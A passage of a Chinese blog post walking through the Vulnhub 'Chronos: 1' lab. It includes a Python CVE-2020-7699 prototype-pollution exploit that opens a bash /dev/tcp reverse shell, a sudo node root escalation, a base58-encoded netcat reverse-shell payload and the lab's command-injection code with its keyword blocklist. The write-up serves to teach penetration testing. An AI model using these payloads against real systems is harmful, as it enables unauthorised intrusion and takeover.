HTTP 服务器</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建 Express 应用</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>(); <span class="comment">// 初始化 Express 应用实例</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用文件上传中间件，并启用解析嵌套对象选项</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">fileupload</span>(&#123; <span class="attr">parseNested</span>: <span class="literal">true</span> &#125;)); <span class="comment">// 中间件处理上传的文件，启用解析嵌套数据结构</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置模板引擎为 EJS</span></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>); <span class="comment">// 指定使用 EJS 作为模板引擎</span></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, <span class="string">&quot;/opt/chronos-v2/frontend/pages&quot;</span>); <span class="comment">// 设置模板文件存放目录，存放 EJS 文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义根路由，渲染首页</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">   res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>); <span class="comment">// 当访问根路径时，渲染 index.ejs 页面</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建 HTTP 服务器并传入 Express 应用实例</span></span><br><span class="line"><span class="keyword">const</span> server = http.<span class="title class_">Server</span>(app); <span class="comment">// 使用 HTTP 模块创建服务器并绑定到 Express 应用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义服务器地址和端口</span></span><br><span class="line"><span class="keyword">const</span> addr = <span class="string">&quot;127.0.0.1&quot;</span>; <span class="comment">// 服务器监听的地址（本地地址）</span></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>; <span class="comment">// 服务器监听的端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动服务器并监听指定的地址和端口</span></span><br><span class="line">server.<span class="title function_">listen</span>(port, addr, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Server listening on &#x27;</span> + addr + <span class="string">&#x27; port &#x27;</span> + port); <span class="comment">// 服务器启动时输出日志</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>另外查得相关进程的所有者是 <code>imera</code> 用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@chronos:/opt/chronos-v2/backend$ ps -ef | grep server.js</span><br><span class="line">imera      908     1  0 08:14 ?        00:00:00 /usr/local/bin/node /opt/chronos-v2/backend/server.js</span><br><span class="line">www-data 30340  1816  0 15:05 pts/0    00:00:00 grep server.js</span><br></pre></td></tr></table></figure>
+<p>利用 CVE-2020-7699 漏洞弹个 <code>imera</code> 用户的 shell</p>
+<p>re_shell.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">cmd = <span class="string">&#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/10.0.3.26/6666 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line">requests.post(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>, files = &#123;<span class="string">&#x27;__proto__.outputFunctionName&#x27;</span>: (</span><br><span class="line">    <span class="literal">None</span>, <span class="string">f&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;);x&quot;</span>)&#125;)</span><br><span class="line">requests.get(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>由于我前面做了代理隧道，所以是在 kali
+直接执行的，没做代理的话可直接传至靶机执行，成功获得 <code>imera</code>
+用户的 shell</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409261237752.jpg" /></p>
+<p>获得 user.txt</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">imera@chronos:/opt/chronos-v2/backend$ <span class="built_in">cd</span> ~</span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">imera@chronos:~$ <span class="built_in">ls</span> -al</span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line">total 40</span><br><span class="line">drwxr-xr-x 6 imera imera 4096 Aug  4  2021 .</span><br><span class="line">drwxr-xr-x 3 root  root  4096 Jul 29  2021 ..</span><br><span class="line">-rw-r--r-- 1 imera imera  220 Apr  4  2018 .bash_logout</span><br><span class="line">-rw-r--r-- 1 imera imera 3771 Apr  4  2018 .bashrc</span><br><span class="line">drwx------ 2 imera imera 4096 Jul 29  2021 .cache</span><br><span class="line">drwx------ 3 imera imera 4096 Jul 29  2021 .gnupg</span><br><span class="line">drwxrwxr-x 3 imera imera 4096 Aug  2  2021 .<span class="built_in">local</span></span><br><span class="line">drwxr-xr-x 4 imera imera 4096 Aug  3  2021 .npm</span><br><span class="line">-rw-r--r-- 1 imera imera  807 Apr  4  2018 .profile</span><br><span class="line">-rw-r--r-- 1 imera imera    0 Jul 29  2021 .sudo_as_admin_successful</span><br><span class="line">-rw------- 1 imera imera   37 Aug  3  2021 user.txt</span><br><span class="line">imera@chronos:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line"><span class="built_in">cat</span> user.txt</span><br><span class="line">byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK</span><br></pre></td></tr></table></figure>
+<h3 id="提权至-root">2.3. 提权至 root</h3>
+<p><code>sudo -l</code> 得当前用户执行 npm 和 node 不受限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">imera@chronos:~$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> imera on chronos:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User imera may run the following commands on chronos:</span><br><span class="line">    (ALL) NOPASSWD: /usr/local/bin/npm *</span><br><span class="line">    (ALL) NOPASSWD: /usr/local/bin/node *</span><br><span class="line">imera@chronos:~$                                                                     </span><br></pre></td></tr></table></figure>
+<p>利用 node 提权【<a
+target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/node/">node |
+GTFOBins</a>】，成功获得 root 权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">imera@chronos:~$ sudo node -e <span class="string">&#x27;require(&quot;child_process&quot;).spawn(&quot;/bin/sh&quot;, &#123;stdio: [0, 1, 2]&#125;)&#x27;</span></span><br><span class="line">&lt;ild_process<span class="string">&quot;).spawn(&quot;</span>/bin/sh<span class="string">&quot;, &#123;stdio: [0, 1, 2]&#125;)&#x27;</span></span><br><span class="line"><span class="string">id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line"><span class="string">cd /root</span></span><br><span class="line"><span class="string">ls -al</span></span><br><span class="line"><span class="string">total 48</span></span><br><span class="line"><span class="string">drwx------  8 root root 4096 Aug  4  2021 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 23 root root 4096 Jul 29  2021 ..</span></span><br><span class="line"><span class="string">-rw-------  1 root root  135 Aug  4  2021 .bash_history</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc</span></span><br><span class="line"><span class="string">drwx------  2 root root 4096 Aug  4  2021 .cache</span></span><br><span class="line"><span class="string">drwx------  3 root root 4096 Jul 30  2021 .config</span></span><br><span class="line"><span class="string">drwx------  3 root root 4096 Aug  4  2021 .gnupg</span></span><br><span class="line"><span class="string">drwxr-xr-x  3 root root 4096 Jul 30  2021 .local</span></span><br><span class="line"><span class="string">drwxr-xr-x  4 root root 4096 Aug  3  2021 .npm</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root root  148 Aug 17  2015 .profile</span></span><br><span class="line"><span class="string">-rw-------  1 root root   41 Aug  3  2021 root.txt</span></span><br><span class="line"><span class="string">drwx------  2 root root 4096 Jul 29  2021 .ssh</span></span><br><span class="line"><span class="string">cat root.txt</span></span><br><span class="line"><span class="string">YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK</span></span><br></pre></td></tr></table></figure>
+<p>提权命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo node -e <span class="string">&#x27;require(&quot;child_process&quot;).spawn(&quot;/bin/sh&quot;, &#123;stdio: [0, 1, 2]&#125;)&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>注解</p>
+<ul>
+<li><strong><code>-e</code></strong>：
+<ul>
+<li>这个选项告诉 <code>Node.js</code> 在命令行直接执行后面的 JavaScript
+代码（而不是从文件中执行）。</li>
+</ul></li>
+<li><strong><code>require("child_process")</code></strong>：
+<ul>
+<li>使用 Node.js 内置的 <code>child_process</code> 模块。这个模块允许在
+Node.js 中创建新的子进程，并通过这些子进程执行外部的命令或程序。</li>
+</ul></li>
+<li><strong><code>spawn("/bin/sh", &#123;stdio: [0, 1, 2]&#125;)</code></strong>：
+<ul>
+<li><strong><code>spawn("/bin/sh")</code></strong>：通过
+<code>spawn</code> 函数启动一个新的 shell（即
+<code>/bin/sh</code>）。<code>/bin/sh</code> 是类 Unix 系统上的基本
+shell 程序，它可以接受和执行命令。</li>
+<li><strong><code>&#123;stdio: [0, 1, 2]&#125;</code></strong>：将子进程的标准输入、标准输出和标准错误与父进程（当前
+shell）绑定。
+<ul>
+<li><code>0</code> 代表
+<strong>标准输入</strong>（<code>stdin</code>），连接到当前终端的输入。</li>
+<li><code>1</code> 代表
+<strong>标准输出</strong>（<code>stdout</code>），连接到当前终端的输出。</li>
+<li><code>2</code> 代表
+<strong>标准错误</strong>（<code>stderr</code>），也连接到当前终端。</li>
+</ul></li>
+</ul></li>
+</ul>
+<h2 id="复盘">3. 复盘</h2>
+<h3 id="命令注入漏洞">3.1. 命令注入漏洞</h3>
+<p>相关代码 app.js</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// created by alienum for Penetration Testing</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>); <span class="comment">// 导入express框架</span></span><br><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>); <span class="comment">// 导入用于执行系统命令的模块</span></span><br><span class="line"><span class="keyword">const</span> bs58 = <span class="built_in">require</span>(<span class="string">&#x27;bs58&#x27;</span>); <span class="comment">// 导入Base58编码解码模块</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>(); <span class="comment">// 创建express应用</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8000</span>; <span class="comment">// 定义端口号</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cors = <span class="built_in">require</span>(<span class="string">&#x27;cors&#x27;</span>); <span class="comment">// 导入CORS模块以支持跨域请求</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cors</span>()); <span class="comment">// 使用CORS中间件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义根路由，发送HTML文件</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(<span class="string">&quot;/var/www/html/index.html&quot;</span>); <span class="comment">// 返回位于/var/www/html/index.html的文件</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义&#x27;/date&#x27;路由</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/date&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> agent = req.<span class="property">headers</span>[<span class="string">&#x27;user-agent&#x27;</span>]; <span class="comment">// 获取请求头中的用户代理</span></span><br><span class="line">    <span class="keyword">var</span> cmd = <span class="string">&#x27;date &#x27;</span>; <span class="comment">// 定义基础命令</span></span><br><span class="line">    <span class="keyword">const</span> format = req.<span class="property">query</span>.<span class="property">format</span>; <span class="comment">// 获取查询参数&#x27;format&#x27;</span></span><br><span class="line">    <span class="keyword">const</span> bytes = bs58.<span class="title function_">decode</span>(format); <span class="comment">// 解码Base58编码的&#x27;format&#x27;</span></span><br><span class="line">    <span class="keyword">var</span> decoded = bytes.<span class="title function_">toString</span>(); <span class="comment">// 将解码后的字节转换为字符串</span></span><br><span class="line">    <span class="keyword">var</span> concat = cmd.<span class="title function_">concat</span>(decoded); <span class="comment">// 将基础命令与解码字符串连接</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查用户代理是否为&#x27;Chronos&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> (agent === <span class="string">&#x27;Chronos&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">// 检查连接的命令是否包含潜在危险命令</span></span><br><span class="line">        <span class="keyword">if</span> (concat.<span class="title function_">includes</span>(<span class="string">&#x27;id&#x27;</span>) || concat.<span class="title function_">includes</span>(<span class="string">&#x27;whoami&#x27;</span>) || concat.<span class="title function_">includes</span>(<span class="string">&#x27;python&#x27;</span>) || </span><br><span class="line">            concat.<span class="title function_">includes</span>(<span class="string">&#x27;nc&#x27;</span>) || concat.<span class="title function_">includes</span>(<span class="string">&#x27;bash&#x27;</span>) || concat.<span class="title function_">includes</span>(<span class="string">&#x27;php&#x27;</span>) || </span><br><span class="line">            concat.<span class="title function_">includes</span>(<span class="string">&#x27;which&#x27;</span>) || concat.<span class="title function_">includes</span>(<span class="string">&#x27;socat&#x27;</span>)) &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;Something went wrong&quot;</span>); <span class="comment">// 如果包含危险命令，返回错误消息</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 执行连接的命令</span></span><br><span class="line">        <span class="title function_">exec</span>(concat, <span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (error) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`error: <span class="subst">$&#123;error.message&#125;</span>`</span>); <span class="comment">// 记录错误消息</span></span><br><span class="line">                <span class="keyword">return</span>; <span class="comment">// 退出</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (stderr) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`stderr: <span class="subst">$&#123;stderr&#125;</span>`</span>); <span class="comment">// 记录标准错误输出</span></span><br><span class="line">                <span class="keyword">return</span>; <span class="comment">// 退出</span></span><br><span class="line">            &#125;</span><br><span class="line">            res.<span class="title function_">send</span>(stdout); <span class="comment">// 返回标准输出</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;Permission Denied&quot;</span>); <span class="comment">// 如果用户代理不是&#x27;Chronos&#x27;，返回权限拒绝消息</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动服务器并监听指定端口</span></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server running at <span class="subst">$&#123;port&#125;</span>`</span>); <span class="comment">// 输出服务器正在运行的消息</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>也可以直接利用 $() 或 `` 将命令拼接在引号里面，但需将 ' <span
+class="math inline">\(\Rightarrow\)</span> " ，示例</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">date</span> <span class="string">&#x27;+Today is %A, %B %d, %Y %H:%M:%S.$(ls)&#x27;</span>  <span class="comment"># 不可行</span></span><br><span class="line"><span class="built_in">date</span> <span class="string">&quot;+Today is %A, %B %d, %Y %H:%M:%S.<span class="subst">$(ls)</span>&quot;</span>  <span class="comment"># 可行</span></span><br></pre></td></tr></table></figure>
+<p>测试如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@chronos:/opt/chronos<span class="comment"># date &#x27;+Today is %A, %B %d, %Y %H:%M:%S.$(ls)&#x27;</span></span><br><span class="line">Today is Wednesday, September 25, 2024 18:44:17.$(<span class="built_in">ls</span>)</span><br><span class="line">root@chronos:/opt/chronos<span class="comment"># date &quot;+Today is %A, %B %d, %Y %H:%M:%S.$(ls)&quot;</span></span><br><span class="line">Today is Wednesday, September 25, 2024 18:46:54.app.js</span><br><span class="line">node_modules</span><br><span class="line">package.json</span><br><span class="line">package-lock.json</span><br><span class="line">phpinfo.php</span><br></pre></td></tr></table></figure>
+<p>注，<code>+</code> 也不可缺！</p>
+<p>web 测试</p>
+<p>修改 app.js 输出下服务端最后要执行的命令【concat】</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409261620743.jpg" /></p>
+<p>修改app.js要重启下该服务，操作示例</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">kill</span> 832</span><br><span class="line">sudo -u www-data /usr/local/bin/node /opt/chronos/app.js &amp;</span><br></pre></td></tr></table></figure>
+<p>测试命令 base58 编码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># cat test        </span></span><br><span class="line"><span class="string">&quot;+Today is %A, %B %d, %Y %H:%M:%S.<span class="subst">$(ls)</span>&quot;</span></span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># cat test| base58</span></span><br><span class="line">8Vdhjjs8juZY3vzTpDi7qA6DNioVrKn2jaKaNWYBfNFFBqdfjq1u6Emw </span><br></pre></td></tr></table></figure>
+<p>可见 exec()
+函数执行的命令：<code>date "+Today is %A, %B %d, %Y %H:%M:%S.$(ls)"</code>，成功获得了目录和文件信息</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409261621687.jpg" /></p>
+<p>app.js 中虽然对危险命令做了检测，但并未拦截 exec()
+函数对恶意命令的执行，应当在检测的 <code>if</code> 后加个
+<code>else</code> ，将 <code>exec()</code> 包含其中，这也是为什么 curl
+能成功上传 php 脚本</p>
+<p>也可以直接利用命令注入反弹 shell
+，不过我试了好几种不过都没成功，每次都连接一下后就断开了，拿不到shell，服务端进程会挂掉，又得重启……</p>
+<p>不过看了其他人的做法 nc 的串联可成功【<a
+target="_blank" rel="noopener" href="https://www.cnblogs.com/cchl/articles/vulnhub_chronos_1.html">Vulnhub打靶记录：chronos_1
+- C_CHL - 博客园</a>】</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp;nc 10.0.0.7 4444 | /bin/bash | nc 10.0.0.7 5555	<span class="comment"># payload2</span></span><br><span class="line">7BFuYVuCc4LN4GQ2dUC2xdLSAik2xH7EAE7B3xdJJuLW13wqYgZwXzfwvbXXSWv4a2p	<span class="comment">## base58编码后的</span></span><br></pre></td></tr></table></figure>
+<p>命令注解【适用 <code>nc</code> 不具有 <code>-e</code>参数的情况】 -
+<strong><code>nc 10.0.0.7 4444</code></strong>: - 通过
+<code>nc</code>（Netcat）连接到 IP 地址 <code>10.0.0.7</code> 的 4444
+端口。<code>nc</code> 是一种通用的网络工具，能够创建 TCP 或 UDP 连接。 -
+这个命令从 <code>10.0.0.7:4444</code>
+接收数据，并将该数据作为输入发送到后面的命令。 -
+<strong><code>| /bin/bash</code></strong>: - 管道符号 <code>|</code>
+将前一个命令（即从 <code>nc 10.0.0.7 4444</code> 获取的数据）传递给
+<code>/bin/bash</code>，也就是说，将从 4444
+端口接收到的内容作为命令在本地执行。 - 换句话说，攻击者从
+<code>10.0.0.7:4444</code> 发送的任何命令都会在本地机器上通过
+<code>bash</code> 执行。 -
+<strong><code>| nc 10.0.0.7 5555</code></strong>: - 将 <code>bash</code>
+的输出通过另一个管道符传递给 <code>nc</code>，并通过它发送到
+<code>10.0.0.7:5555</code>。 - 这意味着，所有 <code>bash</code>
+执行的命令的结果（标准输出和标准错误）会发送回 <code>10.0.0.7</code> 的
+5555 端口。 ### 3.2. CVE-2020-7699</p>
+<p>参见：<a
+target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/246029.html">CVE-2020-7699漏洞分析 -
+FreeBuf网络安全行业门户</a> 或 [[CVE-2020-7699]]</p>
+<h2 id="参考">4. 参考</h2>
+<ul>
+<li><a
+target="_blank" rel="noopener" href="https://www.cnblogs.com/cchl/articles/vulnhub_chronos_1.html">Vulnhub打靶记录：chronos_1
+- C_CHL - 博客园</a><br />
+</li>
+<li><a
+target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/246029.html">CVE-2020-7699漏洞分析 -
+FreeBuf网络安全行业门户</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Phantom
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://z9m8r8.github.io/2024/09/23/Chronos%201/" title="Chronos: 1">https://z9m8r8.github.io/2024/09/23/Chronos 1/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Vulnhub/" rel="tag"><i class="fa fa-tag"></i> Vulnhub</a>
+              <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag"><i class="fa fa-tag"></i> 信息收集</a>
+              <a href="/tags/%E6%8F%90%E6%9D%83/" rel="tag"><i class="fa fa-tag"></i> 提权</a>
+              <a href="/tags/%E5%8F%8D%E5%BC%B9-shell/" rel="tag"><i class="fa fa-tag"></i> 反弹 shell</a>
+              <a href="/tags/Command-Injection/" rel="tag"><i class="fa fa-tag"></i> Command Injection</a>
+              <a href="/tags/Buffer-Overflow/" rel="tag"><i class="fa fa-tag"></i> Buffer Overflow</a>
+              <a href="/tags/Neo-reGeorg/" rel="tag"><i class="fa fa-tag"></i> Neo-reGeorg</a>
+              <a href="/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" rel="tag"><i class="fa fa-tag"></i> 内网穿透</a>
+              <a href="/tags/RCE/" rel="tag"><i class="fa fa-tag"></i> RCE</a>
+              <a href="/tags/JavaScript-Prototype-%E6%B1%A1%E6%9F%93%E6%94%BB%E5%87%BB/" rel="tag"><i class="fa fa-tag"></i> JavaScript Prototype 污染攻击</a>
+              <a href="/tags/node-%E6%8F%90%E6%9D%83/" rel="tag"><i class="fa fa-tag"></i> node 提权</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/09/19/Kioptrix%20Level%201.1/" rel="prev" title="Kioptrix: Level 1.1">
+                  <i class="fa fa-angle-left"></i> Kioptrix: Level 1.1
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2024/09/23/BuffEMR%201.0.1/" rel="next" title="BuffEMR: 1.0.1">
+                  BuffEMR: 1.0.1 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2020 – 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Phantom</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">294k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">17:50</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
